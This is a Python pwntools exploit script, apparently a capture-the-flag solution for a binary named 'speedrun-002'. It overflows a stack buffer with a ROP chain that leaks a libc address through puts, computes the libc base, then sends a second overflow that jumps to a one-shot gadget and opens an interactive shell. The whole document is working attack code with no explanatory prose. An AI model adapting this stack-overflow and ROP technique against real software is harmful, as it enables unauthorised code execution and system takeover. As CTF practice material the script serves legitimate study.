from pwn import *

# Establish target process
target = process('./speedrun-002')
#gdb.attach(target, gdbscript='b *0x4007ba')
#gdb.attach(target, gdbscript='b *0x40072e')

# Establish the binary
binary = ELF('speedrun-002')
libc = ELF('libc-2.27.so')


# Establish rop gadget, and puts values
popRdi = 0x4008a3
putsPlt = binary.symbols['puts']
putsGot = binary.got['puts']

# Where we will return to after puts infoleak
ret = 0x40074c

# Handle I/O stuff to get to overflow
target.sendline('Everything intelligent is so boring.')

print target.recvuntil('Tell me more.')

# Overflow with rop gadget to get libc infoleak,
# And hit vulnerable code path again
payload = '0'*0x408

payload += p64(popRdi)
payload += p64(putsGot)
payload += p64(putsPlt)
payload += p64(ret)


target.send(payload)

print target.recvuntil('Fascinating.\x0a')

# Scan in and filter out infoleak, get libc base

leak = target.recvline().replace("\x0a", "")
leak = u64(leak + "\x00"*(8 - len(leak)))
libcBase = leak - libc.symbols['puts']

# Get address of /bin/sh
binsh = libcBase + 0x1b3e9a

print "libc base: " + hex(libcBase)

# Prep the oneshot gadget overflow
payload = '0'*0x408
payload += p64(libcBase + 0x4f322)

target.sendline('Everything intelligent is so boring.')

print target.recvuntil('Tell me more.')

# Send the oneshot gadget payload
target.send(payload)

target.interactive()